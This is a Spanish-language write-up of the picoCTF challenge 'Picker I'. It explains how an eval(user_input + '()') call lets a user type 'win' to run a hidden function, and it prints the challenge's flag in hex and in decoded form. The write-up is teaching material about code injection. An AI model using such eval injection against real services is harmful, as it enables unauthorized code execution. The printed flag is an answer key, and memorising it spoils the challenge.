## **Reto**:   Picker I
## **Descripción**
This service can provide you with a random number, but can it do anything else?Connect to the program with netcat:`$ nc saturn.picoctf.net 58304`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/514/picker-I.py).
## **Solución**
1. Primero entré al servidor proporcionado `nc saturn.picoctf.net 58304`
2.  También descragué el script
   `wget https://artifacts.picoctf.net/c/514/picker-I.py`
3. Al leer el archivo con `cat picker-I.py`, identifiqué una vulnerabilidad en la función principal:
 `eval(user_input + '()')`
 4. Dentro del código fuente, busqué una función que tuviera acceso a la bandera. `win()`:

`def win():`
  `flag = open('flag.txt', 'r').read()`
  `#... (convierte la flag a hexadecimal)`
  `print(str_flag)`
5. Me conecté de nuevo al servidor 

   `┌──(kali㉿kali)-[~/Documentos/picker1]`
`└─$ nc saturn.picoctf.net 58304`
`Try entering "getRandomNumber" without the double quotes...`
`==> win`
`0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d` 
`Try entering "getRandomNumber" without the double quotes...`
`==>`       

6. El servidor te devolvió la bandera en formato hexadecimal
7. Ingresé lo siguiente para descifrar la bandera 

`┌──(kali㉿kali)-[~]`
`└─$ python3 -c "print(''.join([chr(int(x, 16)) for x in '0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d'.split()]))"`
`picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}`


```
picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}
```

## **Notas adicionales**
 - La función `eval()` en Python ejecuta cadenas de texto como código vivo. Al concatenar la entrada con `()`, el programa permite llamar a cualquier función definida en el script.